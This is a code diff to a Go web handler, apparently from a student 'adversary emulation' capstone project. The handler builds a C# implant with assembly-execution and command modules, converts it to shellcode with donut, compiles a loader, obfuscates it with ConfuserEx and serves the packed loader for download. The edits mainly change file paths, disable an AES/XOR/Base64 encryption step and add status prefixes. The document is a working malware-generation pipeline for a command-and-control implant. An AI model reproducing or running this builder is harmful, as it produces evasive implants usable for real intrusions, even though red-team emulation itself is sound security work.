@@ -22,8 +22,8 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 	basedirlin := config[0].BasedirLin
 
 	var cmd *exec.Cmd
-	fmt.Println("Hit, generating shellcode...")
-	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs && " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
+	fmt.Println("[*] Hit, generating shellcode...")
+	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs && " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"+basedirwin+"donut\\Implant.exe "+basedirwin+"Implant\\Implant.cs "+basedirwin+"Implant\\Modules\\ExecuteAssembly.cs "+basedirwin+"Implant\\Modules\\Commands.cs "+basedirwin+"Implant\\Modules\\CompileAndRunNET.cs && "+basedirwin+"donut\\donut.exe -a 2 --input:"+basedirwin+"donut\\Implant.exe --output:"+basedirwin+"Encryption\\implant.bin")
 	} else {
@@ -36,13 +36,13 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 		log.Fatal("Error: ", err)
 	}
 
-	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
+	// fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
 	// fmt.Println("python " + basedirwin + "Encryption\\Cryptocutter.py -f " + basedirwin + "Encryption\\implant.bin -o " + basedirwin + "OutputShellcode\\implant.bin")
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "python "+basedirwin+"Encryption\\Cryptocutter.py -f "+basedirwin+"Encryption\\implant.bin -o "+basedirwin+"OutputShellcode\\implant.bin")
-	} else {
-		cmd = exec.Command("")
-	}
+	// if runtime.GOOS == "windows" {
+	// 	cmd = exec.Command("cmd", "/c", "python "+basedirwin+"Encryption\\Cryptocutter.py -f "+basedirwin+"Encryption\\implant.bin -o "+basedirwin+"OutputShellcode\\implant.bin")
+	// } else {
+	// 	cmd = exec.Command("")
+	// }
 
 	output, err2 := cmd.Output() // Capture the output of the command
 	if err2 != nil {
@@ -51,10 +51,10 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 		fmt.Println(string(output)) // Print the output
 	}
 
-	fmt.Println("Shellcode generated, compiling loader...")
+	fmt.Println("[*] Shellcode generated, compiling loader...")
 	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
+		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:..\\Loader.exe ..\\Loader\\Loader.cs")
 	}
 
 	err3 := cmd.Run()
@@ -62,10 +62,10 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 		log.Fatal("Error: ", err3)
 	}
 
-	fmt.Println("Encrypting the Loader now...")
+	fmt.Println("[*] Encrypting the Loader now...")
 	// fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
+		cmd = exec.Command("cmd", "/c", "..\\neo-ConfuserExbin\\Confuser.CLI.exe ..\\Loader.exe -o ..\\encrypted_loader\\")
 	}
 
 	_, err4 := cmd.Output() // Capture the output of the command
@@ -73,9 +73,9 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 		log.Fatal("Error: ", err4)
 	}
 
-	fmt.Println("Loader ready, serving for download...")
+	fmt.Println("[+] Loader ready, serving for download...")
 	// fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
-	file, err := os.Open("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
+	file, err := os.Open("..\\encrypted_loader\\Loader.exe")
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
